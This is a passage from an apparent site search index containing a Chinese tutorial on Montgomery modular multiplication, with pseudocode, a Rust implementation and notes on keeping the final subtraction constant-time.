\u200b\u4f4d\u200b\u6574\u6570\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u7b80\u5316\u200b\u5927\u200b\u6574\u6570\u200b\u4e58\u6cd5\u200b\u4e3a\u200b\uff1a</p> <pre><code># m = ((T % R) * N') % R\nfor i=0 to s-1\n    C := 0\n    for j=0 to s-i-1\n        (C, S) := m[i+j] + t[i]*n'[j] + C\n        m[i+j] := S\n</code></pre> <p>\u200b\u63a5\u4e0b\u6765\u200b\u6c42\u5927\u200b\u6574\u6570\u200b \\(m\\) \u200b\u4e58\u4ee5\u200b\u5927\u200b\u6574\u6570\u200b \\(N\\) \u200b\u7684\u200b\u79ef\u200b\uff0c\u200b\u6c42\u79ef\u200b\u7684\u200b\u540c\u65f6\u200b\u628a\u200b\u7ed3\u679c\u200b\u7d2f\u52a0\u200b\u5230\u200b \\(T\\) \u200b\u4e0a\u200b\u3002\u200b\u4f2a\u200b\u4ee3\u7801\u200b\uff1a</p> <pre><code># t += m * N\nfor i=0 to s-1\n    C := 0\n    for j=0 to s-1\n        (C, S) := t[i+j] + m[i]*n[j] + C\n        t[i+j] := S\n    ADD (t[i+s], C)\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b\u7684\u200b ADD \u200b\u51fd\u6570\u200b\u6307\u200b\u7684\u200b\u662f\u200b\u5927\u200b\u6574\u6570\u200b\u52a0\u6cd5\u200b\u8fd0\u7b97\u200b\u91cc\u9762\u200b\uff0c\u200b\u6c42\u548c\u200b\u540e\u200b\u4e0d\u65ad\u200b\u8fdb\u4f4d\u200b\u76f4\u5230\u200b\u4e0d\u518d\u200b\u8fdb\u4f4d\u200b\u4e3a\u6b62\u200b\u7684\u200b\u51fd\u6570\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u5c31\u200b\u4e0d\u200b\u5c55\u5f00\u200b\u4e86\u200b\u3002</p> <p>\u200b\u5728\u200b\u8fd9\u91cc\u200b\u6709\u200b\u4e00\u4e2a\u200b\u91cd\u8981\u200b\u7684\u200b\u4f18\u5316\u200b\uff1a\u200b\u5b9e\u9645\u4e0a\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u628a\u200b \\(m\\) \u200b\u6574\u4e2a\u200b\u5927\u200b\u6574\u6570\u200b\u8ba1\u7b97\u51fa\u6765\u200b\uff0c\u200b\u800c\u662f\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u6c42\u200b \\(T + mN\\)\uff1a\u200b\u56de\u5fc6\u200b\u4e00\u4e0b\u200b\uff0c\u200b\u6700\u521d\u200b\u8ba1\u7b97\u200b \\(T + mN\\) \u200b\u7684\u200b\u76ee\u7684\u200b\u662f\u200b\u8ba9\u200b\u7ed3\u679c\u200b\u6574\u9664\u200b \\(R\\)\uff0c\u200b\u73b0\u5728\u200b\u628a\u200b \\(T + mN\\) \u200b\u7684\u200b\u8ba1\u7b97\u200b\u62c6\u6210\u200b \\(s\\) \u200b\u4e2a\u200b\u5c0f\u6b65\u200b\uff1a\u200b\u7b2c\u200b \\(i\\) \u200b\u6b65\u200b\u8ba9\u200b\u7ed3\u679c\u200b\u6574\u9664\u200b \\(2^{(i+1)w}\\)\uff1a</p> <p>\u200b\u7b2c\u4e00\u6b65\u200b\uff1a\\(T + m_1N \\equiv 0 \\pmod{2^w}\\)\uff0c\u200b\u6b64\u65f6\u200b \\(m_1 = T * N' \\bmod 2^w\\)\uff0c\u200b\u5bf9\u5e94\u200b\u5728\u200b\u4ee3\u7801\u200b\u4e0a\u200b\uff0c\u200b\u5c31\u662f\u200b <code>m_1 = t[0] * n'[0]</code>\uff0c\u200b\u820d\u53bb\u200b\u6ea2\u51fa\u200b\u7684\u200b\u90e8\u5206\u200b\u3002</p> <p>\u200b\u7b2c\u4e8c\u6b65\u200b\uff1a\\(T + m_1N + m_22^wN \\equiv 0 \\pmod{2^{2w}}\\)\uff0c\u200b\u6b64\u65f6\u200b \\(m_2 * 2^w = (T + m_1N) * N' \\bmod 2^{2w}\\)\uff0c\u200b\u6b64\u65f6\u200b\u4f1a\u200b\u60ca\u559c\u200b\u5730\u200b\u53d1\u73b0\u200b\uff0c\u200b\u7531\u4e8e\u200b \\(T + m_1N\\) \u200b\u662f\u200b \\(2^w\\) \u200b\u7684\u200b\u500d\u6570\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8ba1\u7b97\u200b \\((T + m_1N) * N'\\) \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\\(T + m_1N\\) \u200b\u7684\u200b\u4f4e\u200b \\(w\\) \u200b\u4f4d\u5168\u200b\u662f\u200b 0\uff0c\u200b\u4e5f\u200b\u610f\u5473\u7740\u200b\u5b9e\u9645\u4e0a\u200b \\((T + m_1N) * N'\\) \u200b\u5c31\u662f\u200b\u62ff\u200b \\((T + m_1N) \\bmod 2^{2w}\\) \u200b\u7684\u200b\u9ad8\u200b \\(w\\) \u200b\u4f4d\u200b\u4e58\u4ee5\u200b \\(N'\\) \u200b\u7684\u200b\u4f4e\u200b \\(w\\) \u200b\u4f4d\u200b\uff0c\u200b\u518d\u200b\u5de6\u79fb\u200b \\(w\\) \u200b\u4f4d\u200b\uff0c\u200b\u7ed3\u679c\u200b\u7b49\u4e8e\u200b \\(m_2 * 2 ^ w\\)\uff0c\u200b\u6240\u4ee5\u200b \\(m_2\\) \u200b\u5c31\u200b\u7b49\u4e8e\u200b \\(((T+m_1N) \\bmod 2^{2w}) / 2^w * (N' \\bmod 2^w)\\)\uff0c\u200b\u5bf9\u5e94\u200b\u5728\u200b\u4ee3\u7801\u200b\u4e0a\u200b\uff0c\u200b\u5c31\u662f\u200b <code>m_2 = t[1] * n'[0]</code>\u3002</p> <p>\u200b\u8fd9\u4e2a\u200b\u8fc7\u7a0b\u200b\u53ef\u4ee5\u200b\u4e00\u76f4\u200b\u7ee7\u7eed\u4e0b\u53bb\u200b\uff0c\u200b\u6bcf\u200b\u4e00\u6b65\u200b\u7684\u200b <code>m_i</code> \u200b\u90fd\u200b\u53ef\u4ee5\u200b\u7528\u200b <code>m_i = t[i] * n'[0]</code> \u200b\u8ba1\u7b97\u200b\u3002\u200b\u56e0\u6b64\u200b\u4e0d\u518d\u200b\u9700\u8981\u200b\u5148\u6c42\u200b \\(m\\)\uff0c\u200b\u518d\u6c42\u200b \\(T + mN\\)\uff0c\u200b\u800c\u662f\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u8ba1\u7b97\u200b\uff1a</p> <pre><code># t += m * N\nfor i=0 to s-1\n    C := 0\n    # W = 2^w\n    m := t[i] * n'[0] mod W\n    for j=0 to s-1\n        (C, S) := t[i+j] + m*n[j] + C\n        t[i+j] := S\n    ADD (t[i+s], C)\n</code></pre> <p>\u200b\u8ba1\u7b97\u200b\u51fa\u200b \\(T + mN\\) \u200b\u4ee5\u540e\u200b\uff0c\u200b\u6700\u540e\u200b\u5c31\u662f\u200b\u9664\u4ee5\u200b \\(R\\) \u200b\u4e86\u200b\uff0c\u200b\u5b9e\u9645\u4e0a\u200b\u4e5f\u200b\u975e\u5e38\u7b80\u5355\u200b\uff0c\u200b\u76f4\u63a5\u200b\u53bb\u6389\u200b <code>t</code> \u200b\u6570\u7ec4\u200b\u7684\u200b\u4f4e\u200b \\(s\\) \u200b\u9879\u200b\u5373\u53ef\u200b\uff1a</p> <pre><code># u = t / R\nfor i=0 to s\n    u[j] := t[j+s]\n</code></pre> <p>\u200b\u6700\u540e\u200b\u518d\u7528\u200b\u5927\u200b\u6574\u6570\u200b\u51cf\u6cd5\u200b\u548c\u200b\u6bd4\u8f83\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u7ed3\u679c\u200b \\(u\\) \u200b\u843d\u200b\u5728\u200b \\([0, N-1]\\) \u200b\u7684\u200b\u8303\u56f4\u200b\u5185\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u5c31\u200b\u4e0d\u200b\u5355\u72ec\u200b\u5217\u200b\u4ee3\u7801\u200b\u4e86\u200b\u3002\u200b\u628a\u200b\u4e0a\u9762\u200b\u7684\u200b\u4ee3\u7801\u200b\u5408\u5728\u4e00\u8d77\u200b\uff0c\u200b\u5c31\u200b\u5f97\u5230\u200b\u6700\u7ec8\u200b\u5b8c\u6574\u200b Separated Operand Scanning \u200b\u7b97\u6cd5\u200b\u7684\u200b\u4f2a\u200b\u4ee3\u7801\u200b\uff1a</p> <pre><code># t = a * b\nfor i=0 to s-1\n    C := 0\n    for j=0 to s-1\n        (C, S) := t[i+j] + a[j]*b[i] + C\n        t[i+j] := S\n    t[i+s] := C\n\n# t += m * N\nfor i=0 to s-1\n    C := 0\n    # W = 2^w\n    m := t[i] * n'[0] mod W\n    for j=0 to s-1\n        (C, S) := t[i+j] + m*n[j] + C\n        t[i+j] := S\n    ADD (t[i+s], C)\n\n# u = t / R\nfor i=0 to s\n    u[j] := t[j+s]\n\n# return u or u - N\nB := 0\nfor i=0 to s-1\n    (B,D) := u[i] - n[i] - B\n    t[i] := D\n(B,D) := u[s] - B\nt[s] := D\nif B=0 then\n    return t[0], t[1], ... , t[s-1]\nelse\n    return u[0], u[1], ... , u[s-1]\n</code></pre>"},{"location":"cryptography/montgomery_mul_mod.html#coarse-integrated-operand-scanning","title":"Coarse Integrated Operand Scanning","text":"<p>\u200b\u7b2c\u4e8c\u79cd\u200b\u7b97\u6cd5\u200b Coarse Integrated Operand Scanning \u200b\u662f\u200b\u5728\u200b Separated Operand Scanning \u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u628a\u200b \\(a*b\\) \u200b\u548c\u200b\u540e\u9762\u200b\u7684\u200b\u8ba1\u7b97\u200b\u8fc7\u7a0b\u200b\u4ea4\u9519\u200b\u8fdb\u884c\u200b\uff0c\u200b\u653e\u5728\u200b\u540c\u4e00\u4e2a\u200b\u5927\u200b\u5faa\u73af\u200b\u4e2d\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u540e\u9762\u200b\u4f7f\u7528\u200b\u5230\u200b <code>t</code> \u200b\u6570\u7ec4\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ea\u4f1a\u200b\u4f9d\u8d56\u200b\u5df2\u7ecf\u200b\u8ba1\u7b97\u51fa\u6765\u200b\u7684\u200b\u90e8\u5206\u200b\u3002\u200b\u540c\u65f6\u200b\uff0c\u200b\u6bcf\u6b21\u200b\u5faa\u73af\u200b\u7ed3\u675f\u200b\u7684\u200b\u65f6\u5019\u200b\u5c31\u200b\u628a\u200b\u6574\u4e2a\u200b <code>t</code> \u200b\u6570\u7ec4\u200b\u53f3\u79fb\u200b\u4e00\u6b21\u200b\uff0c\u200b\u56e0\u6b64\u200b\u539f\u6765\u200b\u7684\u200b <code>t[i]</code> \u200b\u5c31\u200b\u4f1a\u200b\u53d8\u6210\u200b <code>t[0]</code>\uff0c<code>t[i+j]</code> \u200b\u53d8\u6210\u200b <code>t[j]</code>\u3002</p> <pre><code>for i=0 to s-1\n\n    # t = a * b\n    C := 0\n    for j=0 to s-1\n        (C, S) := t[j] + a[j]*b[i] + C\n        t[j] := S\n    (C, S) := t[s] + C\n    t[s] := S\n    t[s+1] := C\n\n    # t += m * N\n    C := 0\n    # W = 2^w\n    m := t[0] * n'[0] mod W\n    for j=0 to s-1\n        (C, S) := t[j] + m*n[j] + C\n        t[j] := S\n    (C, S) := t[s] + C\n    t[s] := S\n    t[s+1] := t[s+1] + C\n\n    # t /= W\n    for j=0 to s\n        t[j] := t[j+1]\n\n# return t or t - N\n# save as above, omitted\n</code></pre> <p>\u200b\u6bcf\u6b21\u200b\u5faa\u73af\u200b\u90fd\u200b\u53f3\u79fb\u200b\u4e00\u6b21\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5faa\u73af\u200b \\(s\\) \u200b\u6b21\u200b\u5c31\u662f\u200b\u9664\u4ee5\u200b \\(R\\)\uff0c\u200b\u56e0\u6b64\u200b\u539f\u6765\u200b\u7684\u200b \\(u = t / R\\) \u200b\u4e00\u6b65\u200b\u5c31\u200b\u4e0d\u200b\u9700\u8981\u200b\u4e86\u200b\u3002\u200b\u540c\u65f6\u200b\uff0c\\(t\\) \u200b\u6570\u7ec4\u200b\u9700\u8981\u200b\u7684\u200b\u5b58\u50a8\u7a7a\u95f4\u200b\u4e5f\u200b\u7f29\u5c0f\u200b\u4e86\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u4e0d\u200b\u9700\u8981\u200b\u4fdd\u5b58\u200b\u5b8c\u6574\u200b\u7684\u200b \\(a*b\\) \u200b\u7684\u200b\u7ed3\u679c\u200b\u3002\u200b\u66f4\u8fdb\u4e00\u6b65\u200b\uff0c\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u628a\u200b <code>t += m * N</code> \u200b\u548c\u200b\u79fb\u4f4d\u200b\u4e24\u6b65\u200b\u5408\u5e76\u200b\u5728\u200b\u4e00\u8d77\u200b\u8fdb\u884c\u200b\uff1a</p> <pre><code>for i=0 to s-1\n\n    # t = a * b\n    C := 0\n    for j=0 to s-1\n        (C, S) := t[j] + a[j]*b[i] + C\n        t[j] := S\n    (C, S) := t[s] + C\n    t[s] := S\n    t[s+1] := C\n\n    # t = (t + m * N) / W\n    # W = 2^w\n    m := t[0] * n'[0] mod W\n    (C, S) := t[0] + m*n[0]\n    for j=1 to s-1\n        (C, S) := t[j] + m*n[j] + C\n        t[j-1] := S\n    (C, S) := t[s] + C\n    t[s-1] := S\n    t[s] := t[s+1] + C\n\n# return t or t - N\n# save as above, omitted\n</code></pre> <p>\u200b\u8fd9\u6837\u200b\u5c31\u200b\u5f97\u5230\u200b\u4e86\u200b\u6700\u7ec8\u200b\u7684\u200b Coarse Integrated Operand Scanning \u200b\u7b97\u6cd5\u200b\uff0c\u200b\u4e0b\u9762\u200b\u662f\u200b\u4e00\u6bb5\u200b\u7528\u200b Rust \u200b\u8bed\u8a00\u200b\u7f16\u5199\u200b\u7684\u200b\u5b9e\u73b0\u200b\uff1a</p> <pre><code>// https://github.com/jiegec/rust-monty-comparison/blob/6c941d5c95d37dd9ee8f12aa57df577e0f2b623b/src/lib.rs#L89-L139\nlet mut res = [0u32; WORDS + 2];\n// for i=0 to s-1\nfor i in 0..WORDS {\n    // C := 0\n    let mut c = 0;\n    // for j = 0 to s-1\n    for j in 0..WORDS {\n        // (C, S) := t[j] + a[j] * b[i] + C\n        let mut cs = res[j] as u64;\n        cs += self.num[j] as u64 * other.num[i] as u64;\n        cs += c as u64;\n        c = (cs &gt;&gt; 32) as u32;\n        // t[j] := S\n        res[j] = cs as u32;\n    }\n    // (C, S) := t[s] + C\n    let cs = res[WORDS] as u64 + c as u64;\n    // t[s] := S\n    res[WORDS] = cs as u32;\n    // t[s+1] := C\n    res[WORDS + 1] = (cs &gt;&gt; 32) as u32;\n\n    // m := t[0]*n'[0] mod W\n    let m: u32 = (res[0] as u64 * N_INV as u64) as u32;\n    // (C, S) := t[0] + m*n[0]\n    let mut cs = res[0] as u64 + m as u64 * N[0] as u64;\n    c = (cs &gt;&gt; 32) as u32;\n    // for j=1 to s-1\n    for j in 1..WORDS {\n        // (C, S) := t[j] + m*n[j] + C\n        cs = res[j] as u64;\n        cs += m as u64 * N[j] as u64;\n        cs += c as u64;\n        c = (cs &gt;&gt; 32) as u32;\n        // t[j-1] := S\n        res[j - 1] = cs as u32;\n    }\n    // (C, S) := t[s] + C\n    cs = res[WORDS] as u64 + c as u64;\n    // t[s-1] := S\n    res[WORDS - 1] = cs as u32;\n    // t[s] := t[s+1] + C\n    res[WORDS] = res[WORDS + 1] + (cs &gt;&gt; 32) as u32;\n}\n\nlet res_scalar = MontyBigNum::from_u32_slice(&amp;res[0..WORDS]);\nlet mut res_scalar_sub = res_scalar;\nlet borrow = bignum_sub(&amp;mut res_scalar_sub, &amp;MODULO);\nif res[WORDS] != 0 || borrow == 0 {\n    res_scalar_sub\n} else {\n    res_scalar\n}\n</code></pre> <p>OpenSSL \u200b\u4e5f\u200b\u5728\u200b\u51fd\u6570\u200b bn_mul_mont \u200b\u4e2d\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u7b97\u6cd5\u200b\u3002</p>"},{"location":"cryptography/montgomery_mul_mod.html#_5","title":"\u5e38\u6570\u200b\u65f6\u95f4","text":"<p>\u200b\u5728\u200b Montgomery \u200b\u6a21\u4e58\u200b\u7684\u200b\u6700\u540e\u200b\u4e00\u6b65\u200b\uff0c\u200b\u9700\u8981\u200b\u628a\u200b\u8ba1\u7b97\u7ed3\u679c\u200b\u548c\u200b \\(N\\) \u200b\u6bd4\u8f83\u200b\uff0c\u200b\u7136\u540e\u200b\u8fdb\u884c\u200b\u51cf\u6cd5\u200b\uff0c\u200b\u8fd9\u200b\u4e00\u6b65\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u4e00\u4e2a\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u8fd0\u884c\u200b\u65f6\u95f4\u200b\u548c\u200b\u6570\u636e\u200b\u76f8\u5173\u200b\uff0c\u200b\u6210\u4e3a\u200b\u4e00\u4e2a\u200b\u6f5c\u5728\u200b\u7684\u200b\u6d4b\u200b\u4fe1\u9053\u200b\u653b\u51fb\u200b\u7684\u200b\u70b9\u200b\u3002\u200b\u56e0\u6b64\u200b\u4e3a\u4e86\u200b\u89e3\u51b3\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6709\u200b\u5982\u4e0b\u200b\u7684\u200b\u89e3\u51b3\u200b\u65b9\u6cd5\u200b\uff08\u200b\u53c2\u8003\u200b\u8bba\u6587\u200b Montgomery Arithmetic from a Software Perspective\uff09\uff1a</p> <p>\u200b\u65e2\u7136\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\u662f\u200b\u4e3a\u4e86\u200b\u548c\u200b \\(N\\) \u200b\u6bd4\u8f83\u200b\uff0c\u200b\u90a3\u200b\u5982\u679c\u200b\u53bb\u6389\u200b\u8fd9\u4e2a\u200b\u9650\u5236\u200b\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\u8ba9\u200b\u7ed3\u679c\u200b\u5728\u200b \\([0, 2N-1]\\) \u200b\u7684\u200b\u8303\u56f4\u200b\u800c\u200b\u4e0d\u662f\u200b \\([0, N-1]\\)\uff0c\u200b\u770b\u770b\u200b\u80fd\u5426\u200b\u7ee7\u7eed\u200b\u628a\u200b\u7ed3\u679c\u200b\u4f20\u7ed9\u200b\u4e0b\u200b\u4e00\u6b21\u200b\u7684\u200b Montgomery \u200b\u6a21\u4e58\u200b\u3002\u200b\u9996\u5148\u200b\u8981\u6c42\u200b \\(R &gt; 2N\\)\uff0c\u200b\u56e0\u4e3a\u200b\u8f93\u5165\u200b\u53c2\u6570\u200b\u7684\u200b\u8303\u56f4\u200b\u662f\u6a21\u200b \\(2N\\)\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u6a21\u200b \\(N\\)\uff1b\u200b\u5176\u6b21\u200b\uff0c\u200b\u91cd\u65b0\u8003\u8651\u200b \\(t = (T+mN) / R\\) \u200b\u7684\u200b\u653e\u7f29\u200b\uff1a</p> \\[\\begin{align} t &amp;= (T+mN) / R \\\\ &amp;= (ab + mN) / R \\\\ &amp;\\le ((2N-1)(2N-1) + (R-1)N) / R \\end{align}\\] <p>\u200b\u6b64\u65f6\u200b\u4e3a\u4e86\u200b\u8ba9\u200b \\(t &lt; 2N\\) \u200b\u6210\u7acb\u200b\uff0c\u200b\u9700\u8981\u200b\u989d\u5916\u200b\u6dfb\u52a0\u200b\u6761\u4ef6\u200b \\(R &gt; 4N\\)\uff0c\u200b\u6b64\u65f6\u200b\uff1a</p> \\[\\begin{align} t &amp;= (T+mN) / R \\\\ &amp;= (ab + mN) / R \\\\ &amp;\\le ((2N-1)(2N-1) + (R-1)N) / R \\\\ &amp;&lt; ((\\frac{1}{2}R)(2N) + RN) / R \\\\ &amp;= N + N \\\\ &amp;= 2N \\end{align}\\] <p>\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u5982\u679c\u200b\u89c4\u5b9a\u200b \\(R &gt; 4N\\)\uff0c\u200b\u90a3\u4e48\u200b\u6700\u540e\u200b\u4e00\u6b65\u200b\u53ef\u4ee5\u200b\u4e0d\u200b\u548c\u200b \\(N\\) \u200b\u6bd4\u8f83\u200b\uff0c\u200b\u628a\u200b\u7ed3\u679c\u200b\u4fdd\u7559\u200b\u5728\u200b \\([0, 2N-1]\\) \u200b\u7684\u200b\u8303\u56f4\u200b\uff0c\u200b\u7ee7\u7eed\u200b\u8fdb\u884c\u200b\u540e\u7eed\u200b\u7684\u200b Montgomery \u200b\u6a21\u4e58\u200b\u3002\u200b\u4f46\u662f\u200b\u8fd9\u6837\u200b\u6709\u200b\u4e00\u4e2a\u200b\u95ee\u9898\u200b\uff0c\u200b\u5c31\u662f\u200b\u5728\u200b RSA \u200b\u573a\u666f\u200b\u4e0b\u200b\uff0c\u200b\u901a\u5e38\u200b \\(N\\) \u200b\u7684\u200b\u4f4d\u6570\u200b\u5c31\u662f\u200b\u4e8c\u200b\u7684\u200b\u5e42\u6b21\u200b\uff0c\u200b\u4f8b\u5982\u200b \\(N\\) \u200b\u662f\u200b\u4e00\u4e2a\u200b 2048 \u200b\u4f4d\u200b\u7684\u200b\u5927\u200b\u6574\u6570\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u6ee1\u8db3\u200b \\(R &gt; 4N\\)\uff0c\u200b\u4e0d\u5f97\u4e0d\u200b\u591a\u5b58\u200b\u4e00\u4e2a\u200b\u6574\u6570\u200b\uff0c\u200b\u76f8\u5e94\u200b\u5730\u200b Montgomery \u200b\u6a21\u4e58\u200b\u8ba1\u7b97\u200b\u4e2d\u200b\u7684\u200b\u5faa\u73af\u200b\u6b21\u6570\u200b\u4e5f\u200b\u8981\u200b\u589e\u52a0\u200b\u3002</p> <p>\u200b\u53e6\u200b\u4e00\u79cd\u200b\u601d\u8def\u200b\u662f\u200b\uff0c\u200b\u65e2\u7136\u200b\u548c\u200b \\(N\\) \u200b\u6bd4\u8f83\u200b\u6bd4\u8f83\u200b\u8d39\u65f6\u95f4\u200b\uff0c\u200b\u800c\u4e14\u200b\u9700\u8981\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u6539\u6210\u200b\u548c\u200b \\(R\\) \u200b\u6bd4\u8f83\u200b\uff0c\u200b\u8ba9\u200b\u7ed3\u679c\u200b\u4fdd\u6301\u200b\u5728\u200b \\([0, R-1]\\) \u200b\u7684\u200b\u533a\u95f4\u200b\u5185\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u539f\u6765\u200b\u7684\u200b \\([0, N-1]\\) \u200b\u533a\u95f4\u200b\u3002\u200b\u6b64\u65f6\u200b\u91cd\u65b0\u8003\u8651\u200b \\(t = (T+mN) / R\\) \u200b\u7684\u200b\u653e\u7f29\u200b\uff1a</p> \\[\\begin{align} t &amp;= (T+mN) / R \\\\ &amp;= (ab + mN) / R \\\\ &amp;\\le ((R-1)(R-1) + (R-1)N) / R \\\\ &amp;&lt; (R^2 + RN) / R \\\\ &amp;= R + N \\end{align}\\] <p>\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u7ed3\u679c\u200b\u4f1a\u200b\u5728\u200b \\([0, R+N-1]\\) \u200b\u7684\u200b\u8303\u56f4\u200b\u5185\u200b\uff0c\u200b\u6b64\u65f6\u200b\u6700\u540e\u200b\u4e00\u6b65\u200b\u53d8\u6210\u200b\u548c\u200b \\(R\\) \u200b\u6bd4\u8f83\u200b\u5927\u5c0f\u200b\uff0c\u200b\u5982\u679c\u200b\u6bd4\u200b \\(R\\) \u200b\u5927\u200b\uff0c\u200b\u5c31\u200b\u51cf\u53bb\u200b \\(N\\)\u3002\u200b\u548c\u200b \\(R\\) \u200b\u6bd4\u8f83\u200b\u5927\u5c0f\u200b\u5f88\u200b\u7b80\u5355\u200b\uff0c\u200b\u76f4\u63a5\u200b\u770b\u200b\u6700\u9ad8\u200b\u4f4d\u200b\u662f\u5426\u200b\u4e3a\u200b \\(0\\) \u200b\u5373\u53ef\u200b\u3002\u200b\u8fd9\u79cd\u200b\u65b9\u6cd5\u200b\u5e76\u200b\u6ca1\u6709\u200b\u6d88\u9664\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\uff0c\u200b\u4f46\u662f\u200b\u628a\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\u7684\u200b\u5f00\u9500\u200b\u964d\u5230\u200b\u4e86\u200b\u5355\u6b21\u200b\u6574\u6570\u200b\u6bd4\u8f83\u200b\u3002\u200b\u5982\u679c\u200b\u8981\u200b\u4fdd\u8bc1\u200b\u5e38\u6570\u200b\u65f6\u95f4\u200b\u7684\u8bdd\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u7ed3\u679c\u200b\u5c0f\u4e8e\u200b \\(R\\) \u200b\u65f6\u200b\uff0c\u200b\u51cf\u53bb\u200b\u96f6\u200b\u3002</p>"},{"location":"cryptography/montgomery_mul_mod.html#_6","title":"\u9006\u200b\u63a8","text":"<p>\u200b\u4e0b\u9762\u200b\u5c1d\u8bd5\u200b\u9006\u200b\u63a8\u51fa\u200b Montgomery \u200b\u662f\u200b\u5982\u4f55\u200b\u8bbe\u8ba1\u200b Montgomery \u200b\u6a21\u4e58\u200b\u7b97\u6cd5\u200b\u7684\u200b\u3002</p> <p>\u200b\u9996\u5148\u200b\u76ee\u6807\u200b\u662f\u200b\u6c42\u200b \\(t = a * b \\bmod N\\)\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u8981\u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b \\(m\\) \u200b\u6ee1\u8db3\u200b \\(t = a * b + mN \\in [0, N-1]\\)\uff0c\u200b\u4f46\u662f\u200b\u6c42\u200b \\(m\\) \u200b\u7684\u200b\u8fd9\u200b\u4e00\u6b65\u200b\u9700\u8981\u200b\u8ba1\u7b97\u200b\u9664\u6cd5\u200b\u3002\u200b\u65e2\u7136\u200b \\(N\\) \u200b\u4e0d\u200b\u65b9\u4fbf\u200b\u8ba1\u7b97\u200b\u9664\u6cd5\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u5c1d\u8bd5\u200b\u6362\u200b\u4e00\u4e2a\u200b\u9664\u6570\u200b \\(R\\)\uff0c\u200b\u628a\u200b\u95ee\u9898\u200b\u8f6c\u5316\u200b\u4e3a\u6c42\u200b \\(m\\) \u200b\u4f7f\u5f97\u200b \\(t = (a * b + mN) / R \\in [0, N-1]\\)\uff0c\u200b\u6b64\u65f6\u200b \\(t = a * b * R^{-1} \\bmod N\\)\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u8981\u7d27\u200b\uff0c\u200b\u53ea\u8981\u200b\u80fd\u200b\u9ad8\u6548\u200b\u5730\u200b\u8ba1\u7b97\u200b \\(a * b * R^{-1} \\bmod N\\)\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u9ad8\u6548\u200b\u5730\u200b\u8ba1\u7b97\u200b \\(a * b \\bmod N\\)\u3002</p> <p>\u200b\u4e8e\u662f\u200b\u4e0b\u9762\u200b\u7684\u200b\u95ee\u9898\u200b\u5c31\u200b\u6765\u5230\u200b\u4e86\u200b\u600e\u4e48\u200b\u627e\u5230\u200b \\(m\\) \u200b\u4f7f\u5f97\u200b \\(t = (a * b + mN) / R \\in [0, N-1]\\)\u3002\u200b\u628a\u200b \\(R\\) \u200b\u632a\u5230\u200b\u7b49\u5f0f\u200b\u5de6\u8fb9\u200b\uff0c\u200b\u5f97\u5230\u200b</p> \\[ t * R = a * b + m * N \\] <p>\u200b\u7531\u4e8e\u200b \\(t\\) \u200b\u672a\u77e5\u200b\uff0c\u200b\u6240\u4ee5\u200b\u7b49\u5f0f\u200b\u5de6\u8fb9\u200b\u7684\u200b\u503c\u200b\u672a\u77e5\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u6d88\u9664\u200b\u672a\u77e5\u6570\u200b\uff0c\u200b\u7b49\u5f0f\u200b\u4e24\u8fb9\u200b\u540c\u65f6\u200b\u5bf9\u200b \\(R\\) \u200b\u53d6\u4f59\u200b\uff1a</p> \\[ 0 \\equiv a * b + m * N \\pmod R \\] <p>\u200b\u4e8e\u662f\u200b \\(m \\equiv - a * b * N^{-1} \\pmod R\\)\uff0c\u200b\u5176\u4e2d\u200b \\(-N^{-1} \\bmod R\\) \u200b\u7684\u200b\u90e8\u5206\u200b\u53ef\u4ee5\u200b\u9884\u5148\u200b\u8ba1\u7b97\u200b\u597d\u200b\u3002\u200b\u4f46\u662f\u200b\u8fd9\u91cc\u200b\u4f9d\u7136\u200b\u662f\u200b\u5728\u200b\u6a21\u200b \\(R\\) \u200b\u7684\u200b\u610f\u4e49\u200b\u4e0b\u200b\u76f8\u7b49\u200b\uff0c\\(m\\) \u200b\u6709\u200b\u591a\u79cd\u200b\u53ef\u80fd\u200b\u3002</p> <p>\u200b\u5f88\u200b\u5e78\u8fd0\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u524d\u9762\u200b\u5df2\u7ecf\u200b\u63a8\u5bfc\u200b\u8fc7\u200b\uff0c\u200b\u5f53\u200b \\(m = ((a * b) \\bmod R * -N^{-1}) \\bmod R\\) \u200b\u65f6\u200b\uff0c\u200b\u6070\u597d\u200b\u53ef\u4ee5\u200b\u4fdd\u8bc1\u200b\u6700\u7ec8\u200b\u7ed3\u679c\u200b \\(t \\in [0, 